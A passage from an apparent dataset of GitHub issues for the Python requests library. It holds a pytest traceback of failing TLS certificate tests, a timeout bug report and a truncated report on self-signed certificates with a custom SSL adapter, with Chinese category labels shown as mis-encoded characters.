.tox/py313-default/lib/python3.13/site-packages/urllib3/connectionpool.py:787:
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _

self = <urllib3.connectionpool.HTTPSConnectionPool object at 0x7f15fd876350>, conn = <urllib3.connection.HTTPSConnection object at 0x7f15fd8765d0>, method = 'GET', url = '/'
body = None, headers = {'User-Agent': 'python-requests/2.32.3', 'Accept-Encoding': 'gzip, deflate, br', 'Accept': '*/*', 'Connection': 'keep-alive'}
retries = Retry(total=0, connect=None, read=False, redirect=None, status=None), timeout = Timeout(connect=None, read=None, total=None), chunked = False
response_conn = <urllib3.connection.HTTPSConnection object at 0x7f15fd8765d0>, preload_content = False, decode_content = False, enforce_content_length = True

    def _make_request(
        self,
        conn: BaseHTTPConnection,
        method: str,
        url: str,
        body: _TYPE_BODY | None = None,
        headers: typing.Mapping[str, str] | None = None,
        retries: Retry | None = None,
        timeout: _TYPE_TIMEOUT = _DEFAULT_TIMEOUT,
        chunked: bool = False,
        response_conn: BaseHTTPConnection | None = None,
        preload_content: bool = True,
        decode_content: bool = True,
        enforce_content_length: bool = True,
    ) -> BaseHTTPResponse:
        """"""
        Perform a request on a given urllib connection object taken from our
        pool.

        :param conn:
            a connection from one of our connection pools

        :param method:
            HTTP request method (such as GET, POST, PUT, etc.)

        :param url:
            The URL to perform the request on.

        :param body:
            Data to send in the request body, either :class:`str`, :class:`bytes`,
            an iterable of :class:`str`/:class:`bytes`, or a file-like object.

        :param headers:
            Dictionary of custom headers to send, such as User-Agent,
            If-None-Match, etc. If None, pool headers are used. If provided,
            these headers completely replace any pool-specific headers.

        :param retries:
            Configure the number of retries to allow before raising a
            :class:`~urllib3.exceptions.MaxRetryError` exception.

            Pass ``None`` to retry until you receive a response. Pass a
            :class:`~urllib3.util.retry.Retry` object for fine-grained control
            over different types of retries.
            Pass an integer number to retry connection errors that many times,
            but no other types of errors. Pass zero to never retry.

            If ``False``, then retries are disabled and any exception is raised
            immediately. Also, instead of raising a MaxRetryError on redirects,
            the redirect response will be returned.

        :type retries: :class:`~urllib3.util.retry.Retry`, False, or an int.

        :param timeout:
            If specified, overrides the default timeout for this one
            request. It may be a float (in seconds) or an instance of
            :class:`urllib3.util.Timeout`.

        :param chunked:
            If True, urllib3 will send the body using chunked transfer
            encoding. Otherwise, urllib3 will send the body using the standard
            content-length form. Defaults to False.

        :param response_conn:
            Set this to ``None`` if you will handle releasing the connection or
            set the connection to have the response release it.

        :param preload_content:
          If True, the response's body will be preloaded during construction.

        :param decode_content:
            If True, will attempt to decode the body based on the
            'content-encoding' header.

        :param enforce_content_length:
            Enforce content length checking. Body returned by server must match
            value of Content-Length header, if present. Otherwise, raise error.
        """"""
        self.num_requests += 1

        timeout_obj = self._get_timeout(timeout)
        timeout_obj.start_connect()
        conn.timeout = Timeout.resolve_default_timeout(timeout_obj.connect_timeout)

        try:
            # Trigger any extra validation we need to do.
            try:
                self._validate_conn(conn)
            except (SocketTimeout, BaseSSLError) as e:
                self._raise_timeout(err=e, url=url, timeout_value=conn.timeout)
                raise

        # _validate_conn() starts the connection to an HTTPS proxy
        # so we need to wrap errors with 'ProxyError' here too.
        except (
            OSError,
            NewConnectionError,
            TimeoutError,
            BaseSSLError,
            CertificateError,
            SSLError,
        ) as e:
            new_e: Exception = e
            if isinstance(e, (BaseSSLError, CertificateError)):
                new_e = SSLError(e)
            # If the connection didn't successfully connect to it's proxy
            # then there
            if isinstance(
                new_e, (OSError, NewConnectionError, TimeoutError, SSLError)
            ) and (conn and conn.proxy and not conn.has_connected_to_proxy):
                new_e = _wrap_proxy_error(new_e, conn.proxy.scheme)
>           raise new_e
E           urllib3.exceptions.SSLError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: invalid CA certificate (_ssl.c:1029)

.tox/py313-default/lib/python3.13/site-packages/urllib3/connectionpool.py:488: SSLError

The above exception was the direct cause of the following exception:

self = <requests.adapters.HTTPAdapter object at 0x7f15fd854ad0>, request = <PreparedRequest [GET]>, stream = False, timeout = Timeout(connect=None, read=None, total=None)
verify = 'tests/certs/valid/ca/ca.crt', cert = None, proxies = OrderedDict()

    def send(
        self, request, stream=False, timeout=None, verify=True, cert=None, proxies=None
    ):
        """"""Sends PreparedRequest object. Returns Response object.

        :param request: The :class:`PreparedRequest <PreparedRequest>` being sent.
        :param stream: (optional) Whether to stream the request content.
        :param timeout: (optional) How long to wait for the server to send
            data before giving up, as a float, or a :ref:`(connect timeout,
            read timeout) <timeouts>` tuple.
        :type timeout: float or tuple or urllib3 Timeout object
        :param verify: (optional) Either a boolean, in which case it controls whether
            we verify the server's TLS certificate, or a string, in which case it
            must be a path to a CA bundle to use
        :param cert: (optional) Any user-provided SSL certificate to be trusted.
        :param proxies: (optional) The proxies dictionary to apply to the request.
        :rtype: requests.Response
        """"""

        try:
            conn = self.get_connection_with_tls_context(
                request, verify, proxies=proxies, cert=cert
            )
        except LocationValueError as e:
            raise InvalidURL(e, request=request)

        self.cert_verify(conn, request.url, verify, cert)
        url = self.request_url(request, proxies)
        self.add_headers(
            request,
            stream=stream,
            timeout=timeout,
            verify=verify,
            cert=cert,
            proxies=proxies,
        )

        chunked = not (request.body is None or ""Content-Length"" in request.headers)

        if isinstance(timeout, tuple):
            try:
                connect, read = timeout
                timeout = TimeoutSauce(connect=connect, read=read)
            except ValueError:
                raise ValueError(
                    f""Invalid timeout {timeout}. Pass a (connect, read) timeout tuple, ""
                    f""or a single float to set both timeouts to the same value.""
                )
        elif isinstance(timeout, TimeoutSauce):
            pass
        else:
            timeout = TimeoutSauce(connect=timeout, read=timeout)

        try:
>           resp = conn.urlopen(
                method=request.method,
                url=url,
                body=request.body,
                headers=request.headers,
                redirect=False,
                assert_same_host=False,
                preload_content=False,
                decode_content=False,
                retries=self.max_retries,
                timeout=timeout,
                chunked=chunked,
            )

.tox/py313-default/lib/python3.13/site-packages/requests/adapters.py:667:
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
.tox/py313-default/lib/python3.13/site-packages/urllib3/connectionpool.py:841: in urlopen
    retries = retries.increment(
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _

self = Retry(total=0, connect=None, read=False, redirect=None, status=None), method = 'GET', url = '/', response = None
error = SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: invalid CA certificate (_ssl.c:1029)'))
_pool = <urllib3.connectionpool.HTTPSConnectionPool object at 0x7f15fd876350>, _stacktrace = <traceback object at 0x7f15fd886440>

    def increment(
        self,
        method: str | None = None,
        url: str | None = None,
        response: BaseHTTPResponse | None = None,
        error: Exception | None = None,
        _pool: ConnectionPool | None = None,
        _stacktrace: TracebackType | None = None,
    ) -> Self:
        """"""Return a new Retry object with incremented retry counters.

        :param response: A response object, or None, if the server did not
            return a response.
        :type response: :class:`~urllib3.response.BaseHTTPResponse`
        :param Exception error: An error encountered during the request, or
            None if the response was received successfully.

        :return: A new ``Retry`` object.
        """"""
        if self.total is False and error:
            # Disabled, indicate to re-raise the error.
            raise reraise(type(error), error, _stacktrace)

        total = self.total
        if total is not None:
            total -= 1

        connect = self.connect
        read = self.read
        redirect = self.redirect
        status_count = self.status
        other = self.other
        cause = ""unknown""
        status = None
        redirect_location = None

        if error and self._is_connection_error(error):
            # Connect retry?
            if connect is False:
                raise reraise(type(error), error, _stacktrace)
            elif connect is not None:
                connect -= 1

        elif error and self._is_read_error(error):
            # Read retry?
            if read is False or method is None or not self._is_method_retryable(method):
                raise reraise(type(error), error, _stacktrace)
            elif read is not None:
                read -= 1

        elif error:
            # Other retry?
            if other is not None:
                other -= 1

        elif response and response.get_redirect_location():
            # Redirect retry?
            if redirect is not None:
                redirect -= 1
            cause = ""too many redirects""
            response_redirect_location = response.get_redirect_location()
            if response_redirect_location:
                redirect_location = response_redirect_location
            status = response.status

        else:
            # Incrementing because of a server error like a 500 in
            # status_forcelist and the given method is in the allowed_methods
            cause = ResponseError.GENERIC_ERROR
            if response and response.status:
                if status_count is not None:
                    status_count -= 1
                cause = ResponseError.SPECIFIC_ERROR.format(status_code=response.status)
                status = response.status

        history = self.history + (
            RequestHistory(method, url, error, status, redirect_location),
        )

        new_retry = self.new(
            total=total,
            connect=connect,
            read=read,
            redirect=redirect,
            status=status_count,
            other=other,
            history=history,
        )

        if new_retry.is_exhausted():
            reason = error or ResponseError(cause)
>           raise MaxRetryError(_pool, url, reason) from reason  # type: ignore[arg-type]
E           urllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='localhost', port=44229): Max retries exceeded with url: / (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: invalid CA certificate (_ssl.c:1029)')))

.tox/py313-default/lib/python3.13/site-packages/urllib3/util/retry.py:519: MaxRetryError

During handling of the above exception, another exception occurred:

self = <tests.test_requests.TestPreparingURLs object at 0x7f15fd9090e0>

    def test_different_connection_pool_for_tls_settings_verify_bundle_unexpired_cert(
        self,
    ):
        def response_handler(sock):
            consume_socket_content(sock, timeout=0.5)
            sock.send(
                b""HTTP/1.1 200 OK\r\n""
                b""Content-Length: 18\r\n\r\n""
                b'\xff\xfe{\x00""\x00K0""\x00=\x00""\x00\xab0""\x00\r\n'
            )

        s = requests.Session()
        close_server = threading.Event()
        server = TLSServer(
            handler=response_handler,
            wait_to_close_event=close_server,
            requests_to_handle=3,
            cert_chain=""tests/certs/valid/server/server.pem"",
            keyfile=""tests/certs/valid/server/server.key"",
        )

        with server as (host, port):
            url = f""https://{host}:{port}""
            r1 = s.get(url, verify=False)
            assert r1.status_code == 200

>           r2 = s.get(url, verify=""tests/certs/valid/ca/ca.crt"")

tests/test_requests.py:2907:
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
.tox/py313-default/lib/python3.13/site-packages/requests/sessions.py:602: in get
    return self.request(""GET"", url, **kwargs)
.tox/py313-default/lib/python3.13/site-packages/requests/sessions.py:589: in request
    resp = self.send(prep, **send_kwargs)
.tox/py313-default/lib/python3.13/site-packages/requests/sessions.py:703: in send
    r = adapter.send(request, **kwargs)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _

self = <requests.adapters.HTTPAdapter object at 0x7f15fd854ad0>, request = <PreparedRequest [GET]>, stream = False, timeout = Timeout(connect=None, read=None, total=None)
verify = 'tests/certs/valid/ca/ca.crt', cert = None, proxies = OrderedDict()

    def send(
        self, request, stream=False, timeout=None, verify=True, cert=None, proxies=None
    ):
        """"""Sends PreparedRequest object. Returns Response object.

        :param request: The :class:`PreparedRequest <PreparedRequest>` being sent.
        :param stream: (optional) Whether to stream the request content.
        :param timeout: (optional) How long to wait for the server to send
            data before giving up, as a float, or a :ref:`(connect timeout,
            read timeout) <timeouts>` tuple.
        :type timeout: float or tuple or urllib3 Timeout object
        :param verify: (optional) Either a boolean, in which case it controls whether
            we verify the server's TLS certificate, or a string, in which case it
            must be a path to a CA bundle to use
        :param cert: (optional) Any user-provided SSL certificate to be trusted.
        :param proxies: (optional) The proxies dictionary to apply to the request.
        :rtype: requests.Response
        """"""

        try:
            conn = self.get_connection_with_tls_context(
                request, verify, proxies=proxies, cert=cert
            )
        except LocationValueError as e:
            raise InvalidURL(e, request=request)

        self.cert_verify(conn, request.url, verify, cert)
        url = self.request_url(request, proxies)
        self.add_headers(
            request,
            stream=stream,
            timeout=timeout,
            verify=verify,
            cert=cert,
            proxies=proxies,
        )

        chunked = not (request.body is None or ""Content-Length"" in request.headers)

        if isinstance(timeout, tuple):
            try:
                connect, read = timeout
                timeout = TimeoutSauce(connect=connect, read=read)
            except ValueError:
                raise ValueError(
                    f""Invalid timeout {timeout}. Pass a (connect, read) timeout tuple, ""
                    f""or a single float to set both timeouts to the same value.""
                )
        elif isinstance(timeout, TimeoutSauce):
            pass
        else:
            timeout = TimeoutSauce(connect=timeout, read=timeout)

        try:
            resp = conn.urlopen(
                method=request.method,
                url=url,
                body=request.body,
                headers=request.headers,
                redirect=False,
                assert_same_host=False,
                preload_content=False,
                decode_content=False,
                retries=self.max_retries,
                timeout=timeout,
                chunked=chunked,
            )

        except (ProtocolError, OSError) as err:
            raise ConnectionError(err, request=request)

        except MaxRetryError as e:
            if isinstance(e.reason, ConnectTimeoutError):
                # TODO: Remove this in 3.0.0: see #2811
                if not isinstance(e.reason, NewConnectionError):
                    raise ConnectTimeout(e, request=request)

            if isinstance(e.reason, ResponseError):
                raise RetryError(e, request=request)

            if isinstance(e.reason, _ProxyError):
                raise ProxyError(e, request=request)

            if isinstance(e.reason, _SSLError):
                # This branch is for urllib3 v1.22 and later.
>               raise SSLError(e, request=request)
E               requests.exceptions.SSLError: HTTPSConnectionPool(host='localhost', port=44229): Max retries exceeded with url: / (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: invalid CA certificate (_ssl.c:1029)')))

.tox/py313-default/lib/python3.13/site-packages/requests/adapters.py:698: SSLError
______________________________________________________ TestPreparingURLs.test_different_connection_pool_for_mtls_settings ______________________________________________________
urllib3.exceptions.SSLError: [SSL: TLSV1_ALERT_UNKNOWN_CA] tlsv1 alert unknown ca (_ssl.c:2649)

The above exception was the direct cause of the following exception:

self = <requests.adapters.HTTPAdapter object at 0x7f15fd877b10>, request = <PreparedRequest [GET]>, stream = False, timeout = Timeout(connect=None, read=None, total=None)
verify = False, cert = ('tests/certs/mtls/client/client.pem', 'tests/certs/mtls/client/client.key'), proxies = OrderedDict()

    def send(
        self, request, stream=False, timeout=None, verify=True, cert=None, proxies=None
    ):
        """"""Sends PreparedRequest object. Returns Response object.

        :param request: The :class:`PreparedRequest <PreparedRequest>` being sent.
        :param stream: (optional) Whether to stream the request content.
        :param timeout: (optional) How long to wait for the server to send
            data before giving up, as a float, or a :ref:`(connect timeout,
            read timeout) <timeouts>` tuple.
        :type timeout: float or tuple or urllib3 Timeout object
        :param verify: (optional) Either a boolean, in which case it controls whether
            we verify the server's TLS certificate, or a string, in which case it
            must be a path to a CA bundle to use
        :param cert: (optional) Any user-provided SSL certificate to be trusted.
        :param proxies: (optional) The proxies dictionary to apply to the request.
        :rtype: requests.Response
        """"""

        try:
            conn = self.get_connection_with_tls_context(
                request, verify, proxies=proxies, cert=cert
            )
        except LocationValueError as e:
            raise InvalidURL(e, request=request)

        self.cert_verify(conn, request.url, verify, cert)
        url = self.request_url(request, proxies)
        self.add_headers(
            request,
            stream=stream,
            timeout=timeout,
            verify=verify,
            cert=cert,
            proxies=proxies,
        )

        chunked = not (request.body is None or ""Content-Length"" in request.headers)

        if isinstance(timeout, tuple):
            try:
                connect, read = timeout
                timeout = TimeoutSauce(connect=connect, read=read)
            except ValueError:
                raise ValueError(
                    f""Invalid timeout {timeout}. Pass a (connect, read) timeout tuple, ""
                    f""or a single float to set both timeouts to the same value.""
                )
        elif isinstance(timeout, TimeoutSauce):
            pass
        else:
            timeout = TimeoutSauce(connect=timeout, read=timeout)

        try:
>           resp = conn.urlopen(
                method=request.method,
                url=url,
                body=request.body,
                headers=request.headers,
                redirect=False,
                assert_same_host=False,
                preload_content=False,
                decode_content=False,
                retries=self.max_retries,
                timeout=timeout,
                chunked=chunked,
            )

.tox/py313-default/lib/python3.13/site-packages/requests/adapters.py:667:
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
.tox/py313-default/lib/python3.13/site-packages/urllib3/connectionpool.py:841: in urlopen
    retries = retries.increment(
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _

self = Retry(total=0, connect=None, read=False, redirect=None, status=None), method = 'GET', url = '/', response = None
error = SSLError(SSLError(1, '[SSL: TLSV1_ALERT_UNKNOWN_CA] tlsv1 alert unknown ca (_ssl.c:2649)'))
_pool = <urllib3.connectionpool.HTTPSConnectionPool object at 0x7f15fc8e4050>, _stacktrace = <traceback object at 0x7f15fc7a0fc0>

    def increment(
        self,
        method: str | None = None,
        url: str | None = None,
        response: BaseHTTPResponse | None = None,
        error: Exception | None = None,
        _pool: ConnectionPool | None = None,
        _stacktrace: TracebackType | None = None,
    ) -> Self:
        """"""Return a new Retry object with incremented retry counters.

        :param response: A response object, or None, if the server did not
            return a response.
        :type response: :class:`~urllib3.response.BaseHTTPResponse`
        :param Exception error: An error encountered during the request, or
            None if the response was received successfully.

        :return: A new ``Retry`` object.
        """"""
        if self.total is False and error:
            # Disabled, indicate to re-raise the error.
            raise reraise(type(error), error, _stacktrace)

        total = self.total
        if total is not None:
            total -= 1

        connect = self.connect
        read = self.read
        redirect = self.redirect
        status_count = self.status
        other = self.other
        cause = ""unknown""
        status = None
        redirect_location = None

        if error and self._is_connection_error(error):
            # Connect retry?
            if connect is False:
                raise reraise(type(error), error, _stacktrace)
            elif connect is not None:
                connect -= 1

        elif error and self._is_read_error(error):
            # Read retry?
            if read is False or method is None or not self._is_method_retryable(method):
                raise reraise(type(error), error, _stacktrace)
            elif read is not None:
                read -= 1

        elif error:
            # Other retry?
            if other is not None:
                other -= 1

        elif response and response.get_redirect_location():
            # Redirect retry?
            if redirect is not None:
                redirect -= 1
            cause = ""too many redirects""
            response_redirect_location = response.get_redirect_location()
            if response_redirect_location:
                redirect_location = response_redirect_location
            status = response.status

        else:
            # Incrementing because of a server error like a 500 in
            # status_forcelist and the given method is in the allowed_methods
            cause = ResponseError.GENERIC_ERROR
            if response and response.status:
                if status_count is not None:
                    status_count -= 1
                cause = ResponseError.SPECIFIC_ERROR.format(status_code=response.status)
                status = response.status

        history = self.history + (
            RequestHistory(method, url, error, status, redirect_location),
        )

        new_retry = self.new(
            total=total,
            connect=connect,
            read=read,
            redirect=redirect,
            status=status_count,
            other=other,
            history=history,
        )

        if new_retry.is_exhausted():
            reason = error or ResponseError(cause)
>           raise MaxRetryError(_pool, url, reason) from reason  # type: ignore[arg-type]
E           urllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='localhost', port=38677): Max retries exceeded with url: / (Caused by SSLError(SSLError(1, '[SSL: TLSV1_ALERT_UNKNOWN_CA] tlsv1 alert unknown ca (_ssl.c:2649)')))

.tox/py313-default/lib/python3.13/site-packages/urllib3/util/retry.py:519: MaxRetryError

During handling of the above exception, another exception occurred:

self = <tests.test_requests.TestPreparingURLs object at 0x7f15fd908e10>

    def test_different_connection_pool_for_mtls_settings(self):
        client_cert = None

        def response_handler(sock):
            nonlocal client_cert
            client_cert = sock.getpeercert()
            consume_socket_content(sock, timeout=0.5)
            sock.send(
                b""HTTP/1.1 200 OK\r\n""
                b""Content-Length: 18\r\n\r\n""
                b'\xff\xfe{\x00""\x00K0""\x00=\x00""\x00\xab0""\x00\r\n'
            )

        s = requests.Session()
        close_server = threading.Event()
        server = TLSServer(
            handler=response_handler,
            wait_to_close_event=close_server,
            requests_to_handle=2,
            cert_chain=""tests/certs/expired/server/server.pem"",
            keyfile=""tests/certs/expired/server/server.key"",
            mutual_tls=True,
            cacert=""tests/certs/expired/ca/ca.crt"",
        )

        cert = (
            ""tests/certs/mtls/client/client.pem"",
            ""tests/certs/mtls/client/client.key"",
        )
        with server as (host, port):
            url = f""https://{host}:{port}""
>           r1 = s.get(url, verify=False, cert=cert)

tests/test_requests.py:2944:
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
.tox/py313-default/lib/python3.13/site-packages/requests/sessions.py:602: in get
    return self.request(""GET"", url, **kwargs)
.tox/py313-default/lib/python3.13/site-packages/requests/sessions.py:589: in request
    resp = self.send(prep, **send_kwargs)
.tox/py313-default/lib/python3.13/site-packages/requests/sessions.py:703: in send
    r = adapter.send(request, **kwargs)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _

self = <requests.adapters.HTTPAdapter object at 0x7f15fd877b10>, request = <PreparedRequest [GET]>, stream = False, timeout = Timeout(connect=None, read=None, total=None)
verify = False, cert = ('tests/certs/mtls/client/client.pem', 'tests/certs/mtls/client/client.key'), proxies = OrderedDict()

    def send(
        self, request, stream=False, timeout=None, verify=True, cert=None, proxies=None
    ):
        """"""Sends PreparedRequest object. Returns Response object.

        :param request: The :class:`PreparedRequest <PreparedRequest>` being sent.
        :param stream: (optional) Whether to stream the request content.
        :param timeout: (optional) How long to wait for the server to send
            data before giving up, as a float, or a :ref:`(connect timeout,
            read timeout) <timeouts>` tuple.
        :type timeout: float or tuple or urllib3 Timeout object
        :param verify: (optional) Either a boolean, in which case it controls whether
            we verify the server's TLS certificate, or a string, in which case it
            must be a path to a CA bundle to use
        :param cert: (optional) Any user-provided SSL certificate to be trusted.
        :param proxies: (optional) The proxies dictionary to apply to the request.
        :rtype: requests.Response
        """"""

        try:
            conn = self.get_connection_with_tls_context(
                request, verify, proxies=proxies, cert=cert
            )
        except LocationValueError as e:
            raise InvalidURL(e, request=request)

        self.cert_verify(conn, request.url, verify, cert)
        url = self.request_url(request, proxies)
        self.add_headers(
            request,
            stream=stream,
            timeout=timeout,
            verify=verify,
            cert=cert,
            proxies=proxies,
        )

        chunked = not (request.body is None or ""Content-Length"" in request.headers)

        if isinstance(timeout, tuple):
            try:
                connect, read = timeout
                timeout = TimeoutSauce(connect=connect, read=read)
            except ValueError:
                raise ValueError(
                    f""Invalid timeout {timeout}. Pass a (connect, read) timeout tuple, ""
                    f""or a single float to set both timeouts to the same value.""
                )
        elif isinstance(timeout, TimeoutSauce):
            pass
        else:
            timeout = TimeoutSauce(connect=timeout, read=timeout)

        try:
            resp = conn.urlopen(
                method=request.method,
                url=url,
                body=request.body,
                headers=request.headers,
                redirect=False,
                assert_same_host=False,
                preload_content=False,
                decode_content=False,
                retries=self.max_retries,
                timeout=timeout,
                chunked=chunked,
            )

        except (ProtocolError, OSError) as err:
            raise ConnectionError(err, request=request)

        except MaxRetryError as e:
            if isinstance(e.reason, ConnectTimeoutError):
                # TODO: Remove this in 3.0.0: see #2811
                if not isinstance(e.reason, NewConnectionError):
                    raise ConnectTimeout(e, request=request)

            if isinstance(e.reason, ResponseError):
                raise RetryError(e, request=request)

            if isinstance(e.reason, _ProxyError):
                raise ProxyError(e, request=request)

            if isinstance(e.reason, _SSLError):
                # This branch is for urllib3 v1.22 and later.
>               raise SSLError(e, request=request)
E               requests.exceptions.SSLError: HTTPSConnectionPool(host='localhost', port=38677): Max retries exceeded with url: / (Caused by SSLError(SSLError(1, '[SSL: TLSV1_ALERT_UNKNOWN_CA] tlsv1 alert unknown ca (_ssl.c:2649)')))

.tox/py313-default/lib/python3.13/site-packages/requests/adapters.py:698: SSLError
=============================================================================== warnings summary ===============================================================================
tests/test_requests.py::TestPreparingURLs::test_different_connection_pool_for_tls_settings_verify_bundle_unexpired_cert
tests/test_requests.py::TestPreparingURLs::test_different_connection_pool_for_mtls_settings
  /home/cjwatson/src/python/requests/.tox/py313-default/lib/python3.13/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'localhost'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
    warnings.warn(

-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
=========================================================================== short test summary info ============================================================================
FAILED tests/test_requests.py::TestPreparingURLs::test_different_connection_pool_for_tls_settings_verify_bundle_unexpired_cert - requests.exceptions.SSLError: HTTPSConnectionPool(host='localhost', port=44229): Max retries exceeded with url: / (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CE...
FAILED tests/test_requests.py::TestPreparingURLs::test_different_connection_pool_for_mtls_settings - requests.exceptions.SSLError: HTTPSConnectionPool(host='localhost', port=38677): Max retries exceeded with url: / (Caused by SSLError(SSLError(1, '[SSL: TLSV1_ALERT_UNKNOW...
================================================================ 2 failed, 604 deselected, 2 warnings in 0.72s =================================================================
py313-default: exit 1 (1.00 seconds) /home/cjwatson/src/python/requests> pytest -k 'test_different_connection_pool_for_tls_settings_verify_bundle_unexpired_cert or test_different_connection_pool_for_mtls_settings' pid=1712601
  py313-default: FAIL code 1 (2.97=setup[1.97]+cmd[1.00] seconds)
  evaluation failed :( (3.01 seconds)
```

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.1""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.13.2""
  },
  ""platform"": {
    ""release"": ""6.12.12-amd64"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30400000""
  },
  ""urllib3"": {
    ""version"": ""2.3.0""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}
```

I have openssl 3.4.0-2, which is the current version in Debian testing.","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",é«˜,https://github.com/psf/requests/issues/6896
2855048823,[Edited] Add docstring to improve documentation,"Changes made in branch: **MayureshMore:3.0**
[Edited] Add docstring to improve documentation
",æ–‡æ¡£é—®é¢˜,ä¸­,https://github.com/psf/requests/pull/6895
2854007933,timeout on requests.get is not working,"requests.get is not timing out after the set timeout period is elapsed.

Using sample code like below - 

import requests
data_uri = f""https://api.xxxxx.com/xxx/xxxx/xxxx/xxxx/xxx/xxx.json""
print(f""datauri : {data_uri}"")
headers = {
   ""Authorization"": ""Bearer "" + ""access_token"",
   ""Accept"": ""application/json""
}
response = requests.get(data_uri, headers=headers,timeout=10)


Above command will keep running till it is cancelled and no messages after 10 seconds.


requests library version - 2.28.1

As on the screenshot, destination is not reachable and NO response for SYN packet aswell..

![Image](https://github.com/user-attachments/assets/00a7dbfd-086c-41e9-b1c2-d540f7fb5583)","åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥",ä¸­,https://github.com/psf/requests/issues/6894
2848118510,Issue with SSL verification using self-signed certificate in version 2.32.3,"I am experiencing an issue with version 2.32.3 of the library when using build_connection_pool_key_attributes with a self-signed certificate. I need a custom SSL context because the connection fails due to weak certificate strength.

See also https://github.com/psf/requests/issues/6715


## Expected Result

The connection should be established.

## Actual Result

When I run this code, I encounter the following error:

`An error occurred: HTTPSConnectionPool(host='<host>', port=443): Max retries exceeded with url: /<action>/ (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate (_ssl.c:1000)')))`

## Reproduction Steps

```python
import ssl
import requests
from requests.adapters import HTTPAdapter

class SSLAdapter(HTTPAdapter):
    """"""An HTTPAdapter that uses an arbitrary SSL context.""""""

    def __init__(self, ssl_context: ssl.SSLContext = None, **kwargs):
        """"""Initialize the SSLAdapter.""""""
        super().__init__(**kwargs)
        self.ssl_context = ssl_context

    def build_connection_pool_key_attributes(
        self,
        request: requests.PreparedRequest,
        verify: bool | str,
        cert: str | tuple[str, str] | None = None,
    ) -> tuple[dict, dict]:
        host_params, ssl_params = super().build_connection_pool_key_attributes(
            request, verify, cert
        )
        if verify is True and self.ssl_context:
